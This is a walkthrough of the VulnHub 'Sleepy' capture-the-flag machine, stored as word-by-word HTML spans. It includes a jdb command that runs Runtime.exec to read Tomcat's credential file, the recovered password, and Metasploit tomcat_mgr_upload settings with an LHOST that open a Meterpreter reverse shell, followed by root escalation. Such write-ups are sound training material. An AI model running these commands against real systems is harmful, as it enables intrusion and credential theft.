<p id=p0><span id='tok'>In</span><span id='tok'>this</span><span id='tok'>article,</span><span id='tok'>we</span><span id='tok'>are</span><span id='tok'>going</span><span id='tok'>to</span><span id='tok'>solve</span><span id='tok'>a</span><span class='token pointer' id='tok-68-0' style='color:red'>machine</span><span id='tok'>which</span><span id='tok'>was</span><span id='tok'>posted</span><span id='tok'>as</span><span id='tok'>another</span><span class='token pointer' id='tok-68-1' style='color:red'>VM</span><span id='tok'>challenge</span><span id='tok'>on</span><span id='tok'>the</span><span id='tok'>VulnHub</span><span class='token pointer' id='tok-68-2' style='color:red'>website.</span><span id='tok'>The</span><span id='tok'>machine</span><span id='tok'>is</span><span id='tok'>named</span><span id='tok'>Sleepy.</span><span id='tok'>Check</span><span id='tok'>the</span><span class='token pointer' id='tok-68-3' style='color:red'>link</span><span id='tok'>for</span><span id='tok'>the</span><span id='tok'>same</span><span id='tok'>at</span><span id='tok'>the</span><span id='tok'>end</span><span id='tok'>of</span><span id='tok'>this</span><span id='tok'>article.</span><span id='tok'>So,</span><span id='tok'>let's</span><span id='tok'>get</span><span id='tok'>started.</span></p><p id=p42><span id='tok'>I</span><span id='tok'>started</span><span id='tok'>with</span><span id='tok'>running</span><span id='tok'>a</span><span id='tok'>complete</span><span class='token pointer' id='tok-68-4' style='color:red'>Nmap</span><span class='token pointer' id='tok-68-5' style='color:red'>scan</span><span id='tok'>on</span><span id='tok'>the</span><span class='token pointer' id='tok-68-6' style='color:red'>target machine.</span><span id='tok'>got</span><span id='tok'>only</span><span id='tok'>3</span><span class='token pointer' id='tok-68-7' style='color:red'>Ports</span><span id='tok'>open</span><span id='tok'>on</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine.</span><span id='tok'>It</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span class='token pointer' id='tok-68-8' style='color:red'>screenshot.</span></p><p id=p72><span id='tok'>After</span><span id='tok'>that,</span><span id='tok'>I</span><span id='tok'>start</span><span id='tok'>exploring</span><span id='tok'>all</span><span id='tok'>the</span><span class='token pointer' id='tok-68-9' style='color:red'>ports</span><span id='tok'>one</span><span id='tok'>by</span><span id='tok'>one.</span><span id='tok'>On</span><span id='tok'>Port</span><span id='tok'>No</span><span id='tok'>21,</span><span id='tok'>I</span><span id='tok'>tried</span><span id='tok'>the</span><span id='tok'>anonymous</span><span class='token pointer' id='tok-68-10' style='color:red'>Login</span><span id='tok'>on</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine,</span><span id='tok'>but</span><span id='tok'>I</span><span id='tok'>did</span><span id='tok'>not</span><span id='tok'>find</span><span id='tok'>any</span><span id='tok'>interesting</span><span id='tok'>information</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>public</span><span id='tok'>directory.</span><span id='tok'>Anonymous</span><span id='tok'>successful</span><span id='tok'>login</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot.</span></p><p id=p118><span id='tok'>This</span><span id='tok'>vulnerability</span><span id='tok'>alone</span><span id='tok'>was</span><span id='tok'>not</span><span id='tok'>sufficient</span><span id='tok'>for</span><span id='tok'>the</span><span class='token pointer' id='tok-68-11' style='color:red'>exploitation</span><span id='tok'>of</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine.</span><span id='tok'>So,</span><span id='tok'>I</span><span id='tok'>started</span><span id='tok'>to</span><span id='tok'>explore</span><span id='tok'>the</span><span id='tok'>other</span><span id='tok'>ports</span><span id='tok'>which</span><span id='tok'>were</span><span id='tok'>found</span><span id='tok'>open</span><span id='tok'>during</span><span id='tok'>the</span><span id='tok'>Nmap.</span><span id='tok'>The</span><span id='tok'>second</span><span id='tok'>interesting</span><span id='tok'>Port</span><span id='tok'>which</span><span id='tok'>was</span><span id='tok'>identified</span><span id='tok'>during</span><span id='tok'>Nmap</span><span id='tok'>scan</span><span id='tok'>was</span><span id='tok'>9001</span><span id='tok'>which</span><span id='tok'>was</span><span id='tok'>being</span><span id='tok'>used</span><span id='tok'>for</span><span class='token pointer' id='tok-68-12' style='color:red'>JDWP</span><span class='token pointer' id='tok-68-13' style='color:red'>(Java</span><span id='tok'>Debug</span><span id='tok'>Wire</span><span id='tok'>Protocol).</span><span id='tok'>I</span><span id='tok'>started</span><span id='tok'>googling</span><span id='tok'>and</span><span id='tok'>found</span><span id='tok'>that</span><span id='tok'>the</span><span id='tok'>version</span><span id='tok'>of</span><span id='tok'>JDWP</span><span id='tok'>that</span><span id='tok'>was</span><span id='tok'>being</span><span id='tok'>used</span><span id='tok'>on</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine</span><span id='tok'>was</span><span id='tok'>vulnerable</span><span id='tok'>to</span><span id='tok'>remote</span><span id='tok'>code</span><span id='tok'>execution,</span><span id='tok'>and</span><span id='tok'>a</span><span class='token pointer' id='tok-68-14' style='color:red'>Metasploit</span><span class='token pointer' id='tok-68-15' style='color:red'>exploit</span><span id='tok'>was</span><span id='tok'>also</span><span id='tok'>available</span><span id='tok'>for</span><span id='tok'>the</span><span id='tok'>same.</span><span id='tok'>It</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot.</span></p><p id=p210><span id='tok'>After</span><span id='tok'>that,</span><span id='tok'>I</span><span id='tok'>quickly</span><span id='tok'>launched</span><span id='tok'>the</span><span id='tok'>Metasploit</span><span class='token pointer' id='tok-68-16' style='color:red'>framework</span><span id='tok'>to</span><span id='tok'>set</span><span id='tok'>up</span><span id='tok'>the</span><span id='tok'>attack</span><span id='tok'>on</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine.</span><span id='tok'>I</span><span id='tok'>filled</span><span id='tok'>up</span><span id='tok'>all</span><span id='tok'>the</span><span id='tok'>required</span><span class='token pointer' id='tok-68-17' style='color:red'>parameters</span><span id='tok'>and</span><span id='tok'>started</span><span id='tok'>the</span><span id='tok'>attack</span><span id='tok'>on</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine.</span><span id='tok'>Other</span><span id='tok'>details</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot.</span></p><p id=p251><span id='tok'>Let</span><span id='tok'>me</span><span id='tok'>describe</span><span id='tok'>few</span><span id='tok'>things</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot.</span><span id='tok'>First</span><span id='tok'>of</span><span id='tok'>all,</span><span id='tok'>I</span><span id='tok'>have</span><span id='tok'>setup</span><span id='tok'>all</span><span id='tok'>the</span><span id='tok'>required</span><span id='tok'>parameters</span><span id='tok'>for</span><span id='tok'>the</span><span id='tok'>exploit</span><span id='tok'>such</span><span id='tok'>as</span><span id='tok'>RHOST</span><span id='tok'><</span><span id='tok'>Target</span><span id='tok'>IP</span><span id='tok'>>,</span><span id='tok'>RPORT</span><span id='tok'><</span><span id='tok'>Target</span><span id='tok'>PORT</span><span id='tok'>>,</span><span class='token pointer' id='tok-68-18' style='color:red'>LPORT</span><span id='tok'><</span><span id='tok'>Local</span><span id='tok'>IP</span><span id='tok'>for</span><span id='tok'>Reverse</span><span id='tok'>Connection>,</span><span id='tok'>LPORT</span><span id='tok'><</span><span id='tok'>Local</span><span id='tok'>Port</span><span id='tok'>for</span><span id='tok'>Reverse</span><span id='tok'>Connection</span><span id='tok'>>.</span><span id='tok'>After</span><span id='tok'>that,</span><span id='tok'>I</span><span id='tok'>ran</span><span id='tok'>a</span><span id='tok'>command</span><span id='tok'>check.</span><span id='tok'>Check</span><span id='tok'>is</span><span id='tok'>a</span><span id='tok'>command</span><span id='tok'>which</span><span id='tok'>is</span><span id='tok'>used</span><span id='tok'>to</span><span id='tok'>verify</span><span id='tok'>whether</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine</span><span id='tok'>is</span><span id='tok'>vulnerable</span><span id='tok'>or</span><span id='tok'>not.</span><span id='tok'>The</span><span id='tok'>output</span><span id='tok'>of</span><span id='tok'>the</span><span id='tok'>command</span><span id='tok'>gives</span><span id='tok'>a</span><span id='tok'>smile</span><span id='tok'>on</span><span id='tok'>my</span><span id='tok'>face</span><span id='tok'>as</span><span id='tok'>it</span><span id='tok'>was</span><span id='tok'>showing</span><span id='tok'>that</span><span id='tok'>target</span><span id='tok'>machine</span><span id='tok'>was</span><span id='tok'>vulnerable</span><span id='tok'>for</span><span id='tok'>the</span><span id='tok'>exploit.</span><span id='tok'>So,</span><span id='tok'>I</span><span id='tok'>fired</span><span id='tok'>the</span><span id='tok'>Metasploit</span><span id='tok'>gun</span><span id='tok'>on</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine</span><span id='tok'>hoping</span><span id='tok'>for</span><span id='tok'>the</span><span id='tok'>reverse</span><span id='tok'>connection.</span><span id='tok'>However,</span><span id='tok'>the</span><span id='tok'>final</span><span id='tok'>output</span><span id='tok'>was</span><span id='tok'>not</span><span id='tok'>as</span><span id='tok'>expected.</span><span id='tok'>It</span><span id='tok'>says</span><span id='tok'>that</span><span id='tok'>"Exploit</span><span id='tok'>Completed,</span><span id='tok'>but</span><span id='tok'>no</span><span id='tok'>session</span><span id='tok'>was</span><span id='tok'>created."</span></p><p id=p380><span id='tok'>After</span><span id='tok'>that,</span><span id='tok'>I</span><span id='tok'>tried</span><span id='tok'>many</span><span id='tok'>different</span><span id='tok'>ways</span><span id='tok'>to</span><span id='tok'>run</span><span id='tok'>this</span><span id='tok'>exploit,</span><span id='tok'>but</span><span id='tok'>it</span><span id='tok'>was</span><span id='tok'>not</span><span id='tok'>successful.</span><span id='tok'>So,</span><span id='tok'>I</span><span id='tok'>decided</span><span id='tok'>to</span><span id='tok'>explore</span><span id='tok'>some</span><span id='tok'>other</span><span id='tok'>method</span><span id='tok'>to</span><span id='tok'>break</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine.</span><span id='tok'>After</span><span id='tok'>doing</span><span id='tok'>some</span><span id='tok'>research</span><span id='tok'>on</span><span id='tok'>it,</span><span id='tok'>I</span><span id='tok'>found</span><span id='tok'>a</span><span id='tok'>way</span><span id='tok'>in</span><span id='tok'>which</span><span id='tok'>I</span><span id='tok'>will</span><span id='tok'>be</span><span id='tok'>adding</span><span id='tok'>an</span><span class='token pointer' id='tok-68-19' style='color:red'>Apache</span><span id='tok'>module</span><span id='tok'>and</span><span id='tok'>doing</span><span id='tok'>some</span><span class='token pointer' id='tok-68-20' style='color:red'>configuration</span><span id='tok'>changes.</span><span id='tok'>Steps</span><span id='tok'>are</span><span id='tok'>given</span><span id='tok'>below.</span></p><p id=p437><span id='tok'>First</span><span id='tok'>of</span><span id='tok'>all,</span><span id='tok'>I</span><span id='tok'>installed</span><span id='tok'>the</span><span id='tok'>module</span><span class='token pointer' id='tok-68-21' style='color:red'>libapache2-mod-jk.</span><span id='tok'>It</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot.</span></p><p id=p453><span id='tok'>As</span><span id='tok'>we</span><span id='tok'>can</span><span id='tok'>see</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot,</span><span id='tok'>the</span><span id='tok'>Apache</span><span id='tok'>module</span><span id='tok'>is</span><span id='tok'>successfully</span><span id='tok'>installed</span><span id='tok'>and</span><span id='tok'>configured.</span></p><p id=p469><span id='tok'>After</span><span id='tok'>that,</span><span id='tok'>I</span><span id='tok'>did</span><span id='tok'>some</span><span id='tok'>changes</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>configuration</span><span id='tok'>of</span><span id='tok'>the</span><span id='tok'>module.Configuration</span><span id='tok'>Changes</span><span id='tok'>File</span><span id='tok'>Name:</span><span id='tok'>/etc/apache2/mods-available/jk.conf</span></p><p id=p485><span id='tok'>In</span><span id='tok'>the</span><span id='tok'>highlighted</span><span id='tok'>area</span><span id='tok'>on</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot,</span><span id='tok'>you</span><span id='tok'>can</span><span id='tok'>see</span><span id='tok'>that</span><span id='tok'>I</span><span id='tok'>have</span><span id='tok'>changed</span><span id='tok'>JKWorkerFile</span><span class='token pointer' id='tok-68-22' style='color:red'>/etc/libapache2-mod-jk/workers.properties</span><span id='tok'>to</span><span id='tok'>/etc/apache2/workers.properties</span><span id='tok'>file</span><span id='tok'>Path.</span></p><p id=p506><span id='tok'>Now,</span><span id='tok'>I</span><span id='tok'>copied</span><span id='tok'>the</span><span id='tok'>worker.properties</span><span id='tok'>file</span><span id='tok'>from</span><span id='tok'>/etc/libapache2-mod-jk/workers.properties</span><span id='tok'>to</span><span id='tok'>/etc/apache2/</span><span id='tok'>folder.</span><span id='tok'>It</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot.</span></p><p id=p525><span id='tok'>It</span><span id='tok'>is</span><span id='tok'>time</span><span id='tok'>to</span><span id='tok'>change</span><span id='tok'>the</span><span class='token pointer' id='tok-68-23' style='color:red'>IP Address</span><span id='tok'>the</span><span id='tok'>worker.properties</span><span id='tok'>file.</span><span id='tok'>It</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot.</span></p><p id=p545><span id='tok'>As</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>highlighted</span><span id='tok'>area</span><span id='tok'>we</span><span id='tok'>have</span><span id='tok'>added</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine</span><span class='token pointer' id='tok-68-24' style='color:red'>IP address</span><span id='tok'>the</span><span id='tok'>worker.host.</span></p><p id=p564><span id='tok'>After</span><span id='tok'>this</span><span id='tok'>change,</span><span id='tok'>I</span><span id='tok'>have</span><span id='tok'>done</span><span id='tok'>one</span><span id='tok'>more</span><span id='tok'>change</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>Apache</span><span id='tok'>default</span><span id='tok'>configuration</span><span id='tok'>file</span><span id='tok'>for</span><span id='tok'>the</span><span id='tok'>exploit</span><span id='tok'>to</span><span id='tok'>work.File</span><span id='tok'>Name:</span><span id='tok'>/etc/apache2/sites-available/000-default.conf</span></p><p id=p586><span id='tok'>In</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot,</span><span id='tok'>highlighted</span><span id='tok'>line</span><span id='tok'>is</span><span id='tok'>added</span><span id='tok'>by</span><span id='tok'>me.</span></p><p id=p596><span id='tok'>Now</span><span id='tok'>it</span><span id='tok'>is</span><span id='tok'>time</span><span id='tok'>to</span><span id='tok'>hit</span><span id='tok'>the</span><span class='token pointer' id='tok-68-25' style='color:red'>localhost</span><span id='tok'>on</span><span id='tok'>the</span><span class='token pointer' id='tok-68-26' style='color:red'>browser.</span></p><p id=p607><span id='tok'>We</span><span id='tok'>can</span><span id='tok'>see</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot;</span><span id='tok'>my</span><span id='tok'>machine</span><span id='tok'>is</span><span id='tok'>now</span><span id='tok'>linked</span><span id='tok'>with</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine,</span><span id='tok'>and</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine</span><span class='token pointer' id='tok-68-27' style='color:red'>Tomcat</span><span id='tok'>is</span><span id='tok'>running</span><span id='tok'>on</span><span id='tok'>my</span><span id='tok'>localhost.</span><span id='tok'>However,</span><span id='tok'>I</span><span id='tok'>cannot</span><span id='tok'>access</span><span id='tok'>the</span><span class='token pointer' id='tok-68-28' style='color:red'>Manage App</span><span id='tok'>as</span><span id='tok'>it</span><span id='tok'>requires</span><span id='tok'>the</span><span id='tok'>password.</span></p><p id=p646><span id='tok'>So,</span><span id='tok'>I</span><span id='tok'>connected</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine</span><span id='tok'>using</span><span id='tok'>JDB</span><span id='tok'>through</span><span id='tok'>port</span><span id='tok'>9001</span><span id='tok'>without</span><span id='tok'>the</span><span class='token pointer' id='tok-68-29' style='color:red'>credentials</span><span id='tok'>it</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot.</span></p><p id=p668><span id='tok'>To</span><span id='tok'>access</span><span id='tok'>the</span><span id='tok'>Manage</span><span id='tok'>App</span><span id='tok'>section</span><span id='tok'>on</span><span id='tok'>this</span><span id='tok'>machine,</span><span id='tok'>we</span><span id='tok'>require</span><span id='tok'>the</span><span id='tok'>password.</span><span id='tok'>The</span><span id='tok'>login</span><span id='tok'>credentials</span><span id='tok'>in</span><span id='tok'>Tomcat</span><span id='tok'>are</span><span id='tok'>stored</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>"/etc/tomcat/tomcat-users.xml"</span><span id='tok'>file.</span><span id='tok'>So,</span><span id='tok'>I</span><span id='tok'>wrote</span><span id='tok'>some</span><span id='tok'>Java</span><span id='tok'>code</span><span id='tok'>for</span><span id='tok'>reading</span><span id='tok'>this</span><span id='tok'>file.</span><span id='tok'>It</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot.</span></p><p id=p710><span id='tok'>Command</span><span id='tok'>Used:</span></p><p id=p712><span id='tok'>jdb</span><span id='tok'>-attach</span><span id='tok'>192.168.1.70:9001threadsinterrupt</span><span id='tok'>0x1a1</span><span id='tok'>{Interrupting</span><span id='tok'>the</span><span id='tok'>Main</span><span id='tok'>Thread}print</span><span id='tok'>new</span><span id='tok'>java.lang.String(new</span><span id='tok'>java.io.BufferedReader(new</span><span id='tok'>java.io.InputStreamReader(new</span><span id='tok'>java.lang.Runtime().exec("tail</span><span id='tok'>-n</span><span id='tok'>3</span><span id='tok'>/etc/tomcat/tomcat-users.xml").getInputStream())).readLine())</span><span id='tok'>{Extracting</span><span id='tok'>the</span><span id='tok'>credentials</span><span id='tok'>from</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine}</span></p><p id=p735><span id='tok'>As</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot,</span><span id='tok'>by</span><span id='tok'>running</span><span id='tok'>the</span><span class='token pointer' id='tok-68-30' style='color:red'>commands</span><span id='tok'>one</span><span id='tok'>by</span><span id='tok'>one</span><span id='tok'>I</span><span id='tok'>successfully</span><span id='tok'>retrieved</span><span id='tok'>the</span><span id='tok'>credentials</span><span id='tok'>from</span><span id='tok'>the</span><span id='tok'>file.</span><span id='tok'>Now</span><span id='tok'>that</span><span id='tok'>we</span><span id='tok'>have</span><span id='tok'>the</span><span id='tok'>credentials</span><span id='tok'>we</span><span id='tok'>can</span><span id='tok'>login</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>tomcat</span><span id='tok'>Manage</span><span id='tok'>App</span><span id='tok'>section.</span></p><p id=p773><span id='tok'>As</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot,</span><span id='tok'>I</span><span id='tok'>have</span><span id='tok'>successfully</span><span id='tok'>logged</span><span id='tok'>in</span><span id='tok'>into</span><span id='tok'>the</span><span id='tok'>application.</span><span id='tok'>After</span><span id='tok'>that,</span><span id='tok'>I</span><span id='tok'>used</span><span id='tok'>Metasploit</span><span id='tok'>exploit</span><span id='tok'>for</span><span id='tok'>shell</span><span id='tok'>access.</span><span id='tok'>Used</span><span id='tok'>commands</span><span id='tok'>are</span><span id='tok'>given</span><span id='tok'>below.</span></p><p id=p803><span id='tok'>use</span><span class='token pointer' id='tok-68-31' style='color:red'>exploit/multi/http/tomcat_mgr_uploadset</span><span id='tok'>HttpPassword</span><span id='tok'>Gu3SSmYStR0NgPa$sw0rD!set</span><span id='tok'>HttpUsername</span><span id='tok'>sl33pyset</span><span id='tok'>rhost</span><span id='tok'>127.0.0.1set</span><span id='tok'>rport</span><span id='tok'>80set</span><span id='tok'>LHOST</span><span id='tok'>192.168.1.120In</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot,</span><span id='tok'>I</span><span id='tok'>ran</span><span id='tok'>above</span><span id='tok'>command</span><span id='tok'>one</span><span id='tok'>by</span><span id='tok'>one.</span></p><p id=p825><span class='token pointer' id='tok-68-32' style='color:red'>Hacking</span><span class='token pointer' id='tok-68-33' style='color:red'>Ethical</span><span id='tok'>â€“</span><span id='tok'>Resources</span><span id='tok'>(InfoSec)</span></p><p id=p831><span id='tok'>As</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot,</span><span id='tok'>after</span><span id='tok'>setting</span><span id='tok'>all</span><span id='tok'>the</span><span id='tok'>required</span><span id='tok'>options</span><span id='tok'>I</span><span id='tok'>hit</span><span id='tok'>the</span><span id='tok'>exploit,</span><span id='tok'>and</span><span id='tok'>successfully</span><span id='tok'>got</span><span id='tok'>the</span><span class='token pointer' id='tok-68-34' style='color:red'>Meterpreter</span><span class='token pointer' id='tok-68-35' style='color:red'>Reverse connection</span><span id='tok'>of</span><span id='tok'>the</span><span id='tok'>target</span><span id='tok'>machine.</span><span id='tok'>After</span><span id='tok'>running</span><span id='tok'>few</span><span id='tok'>commands,</span><span id='tok'>I</span><span id='tok'>got</span><span id='tok'>to</span><span id='tok'>know</span><span id='tok'>that</span><span id='tok'>this</span><span id='tok'>is</span><span id='tok'>the</span><span id='tok'>limited</span><span id='tok'>shell</span><span id='tok'>access</span><span id='tok'>and</span><span id='tok'>I</span><span id='tok'>need</span><span id='tok'>to</span><span id='tok'>take</span><span id='tok'>the</span><span class='token pointer' id='tok-68-36' style='color:red'>root</span><span id='tok'>access</span><span id='tok'>to</span><span id='tok'>complete</span><span id='tok'>the</span><span id='tok'>machine.</span></p><p id=p888><span id='tok'>I</span><span id='tok'>tried</span><span id='tok'>a</span><span id='tok'>few</span><span id='tok'>methods,</span><span id='tok'>but</span><span id='tok'>those</span><span id='tok'>methods</span><span id='tok'>were</span><span id='tok'>not</span><span id='tok'>working.</span><span id='tok'>So,</span><span id='tok'>I</span><span id='tok'>started</span><span id='tok'>to</span><span id='tok'>use</span><span class='token pointer' id='tok-68-37' style='color:red'>Linux</span><span class='token pointer' id='tok-68-38' style='color:red'>g0tmilk</span><span class='token pointer' id='tok-68-39' style='color:red'>Escalation</span><span id='tok'>checklist.</span><span id='tok'>This</span><span id='tok'>is</span><span id='tok'>a</span><span id='tok'>very</span><span id='tok'>helpful</span><span id='tok'>checklist</span><span id='tok'>for</span><span id='tok'>enumeration.</span><span id='tok'>You</span><span id='tok'>may</span><span id='tok'>check</span><span id='tok'>the</span><span class='token pointer' id='tok-68-40' style='color:red'>URL</span><span id='tok'>that</span><span id='tok'>is</span><span id='tok'>given</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>reference</span><span id='tok'>section.</span><span id='tok'>After</span><span id='tok'>spending</span><span id='tok'>some</span><span id='tok'>time</span><span id='tok'>on</span><span id='tok'>the</span><span id='tok'>enumeration,</span><span id='tok'>I</span><span id='tok'>got</span><span id='tok'>a</span><span id='tok'>command</span><span id='tok'>which</span><span id='tok'>returns</span><span id='tok'>all</span><span id='tok'>the</span><span class='token pointer' id='tok-68-41' style='color:red'>executables</span><span id='tok'>that</span><span id='tok'>could</span><span id='tok'>be</span><span id='tok'>run</span><span id='tok'>as</span><span id='tok'>owner,</span><span id='tok'>not</span><span id='tok'>the</span><span id='tok'>user</span><span id='tok'>who</span><span id='tok'>started</span><span id='tok'>it.</span><span id='tok'>The</span><span id='tok'>output</span><span id='tok'>of</span><span id='tok'>the</span><span id='tok'>command</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot.</span></p><p id=p969><span id='tok'>In</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot,</span><span id='tok'>the</span><span id='tok'>list</span><span id='tok'>of</span><span id='tok'>the</span><span id='tok'>executables</span><span id='tok'>is</span><span id='tok'>given</span><span id='tok'>which</span><span id='tok'>could</span><span id='tok'>be</span><span id='tok'>run</span><span id='tok'>with</span><span id='tok'>this</span><span id='tok'>user.</span><span id='tok'>While</span><span id='tok'>exploring</span><span id='tok'>these</span><span id='tok'>executables,</span><span id='tok'>I</span><span id='tok'>found</span><span id='tok'>an</span><span id='tok'>interesting</span><span id='tok'>file</span><span id='tok'>which</span><span id='tok'>says,</span><span class='token pointer' id='tok-68-42' style='color:red'>"Error Opening Terminal."</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot.</span></p><p id=p1009><span id='tok'>After</span><span id='tok'>doing</span><span id='tok'>some</span><span id='tok'>reverse</span><span id='tok'>engineering</span><span id='tok'>on</span><span id='tok'>this</span><span id='tok'>executable</span><span id='tok'>file.</span><span id='tok'>I</span><span id='tok'>found</span><span id='tok'>that</span><span id='tok'>this</span><span id='tok'>is</span><span id='tok'>used</span><span id='tok'>to</span><span id='tok'>include</span><span id='tok'>and</span><span id='tok'>execute</span><span id='tok'>other</span><span id='tok'>commands</span><span id='tok'>as</span><span id='tok'>a</span><span id='tok'>root.</span><span id='tok'>So,</span><span id='tok'>I</span><span id='tok'>ran</span><span id='tok'>this</span><span id='tok'>command</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>first</span><span id='tok'>terminal,</span><span id='tok'>and</span><span id='tok'>I</span><span id='tok'>took</span><span id='tok'>another</span><span id='tok'>session</span><span id='tok'>to</span><span id='tok'>kill</span><span id='tok'>the</span><span id='tok'>process.</span></p><p id=p1051><span id='tok'>As</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>below</span><span id='tok'>screenshot,</span><span id='tok'>I</span><span id='tok'>ran</span><span id='tok'>a</span><span id='tok'>few</span><span id='tok'>commands</span><span class='token pointer' id='tok-68-43' style='color:red'>in T1,</span><span id='tok'>after</span><span id='tok'>that</span><span id='tok'>I</span><span id='tok'>ran</span><span id='tok'>process,</span><span id='tok'>and</span><span id='tok'>at</span><span id='tok'>the</span><span id='tok'>same</span><span id='tok'>time</span><span id='tok'>I</span><span id='tok'>ran</span><span class='token pointer' id='tok-68-44' style='color:red'>PS command to</span><span id='tok'>the</span><span id='tok'>process</span><span id='tok'>ID</span><span id='tok'>of</span><span id='tok'>that</span><span id='tok'>process</span><span id='tok'>and</span><span id='tok'>after</span><span id='tok'>getting</span><span id='tok'>the</span><span id='tok'>process</span><span id='tok'>ID</span><span id='tok'>I</span><span id='tok'>ran</span><span id='tok'>the</span><span id='tok'>kill</span><span id='tok'>command</span><span id='tok'>to</span><span id='tok'>terminate</span><span id='tok'>the</span><span id='tok'>process</span><span id='tok'>which</span><span id='tok'>gave</span><span id='tok'>me</span><span class='token pointer' id='tok-68-45' style='color:red'>root shell</span><span id='tok'>the</span><span id='tok'>T1</span><span id='tok'>screen.</span></p><p id=p1113><span id='tok'>Finally,</span><span id='tok'>I</span><span id='tok'>go</span><span id='tok'>a</span><span id='tok'>root</span><span id='tok'>shell</span><span id='tok'>on</span><span id='tok'>this</span><span id='tok'>machine.</span><span id='tok'>Let's</span><span id='tok'>read</span><span id='tok'>the</span><span id='tok'>flag</span><span id='tok'>in</span><span id='tok'>the</span></p><p id=p1130><span id='tok'>As</span><span id='tok'>can</span><span id='tok'>be</span><span id='tok'>seen</span><span id='tok'>in</span><span id='tok'>the</span><span id='tok'>above</span><span id='tok'>screenshot,</span><span id='tok'>I</span><span id='tok'>got</span><span id='tok'>the</span><span id='tok'>flag.</span><span id='tok'>And</span><span id='tok'>now,</span><span id='tok'>the</span><span id='tok'>Challenge</span><span id='tok'>is</span><span id='tok'>Completed!</span></p><p id=p1148><span id='tok'></span><span id='tok'></span></p>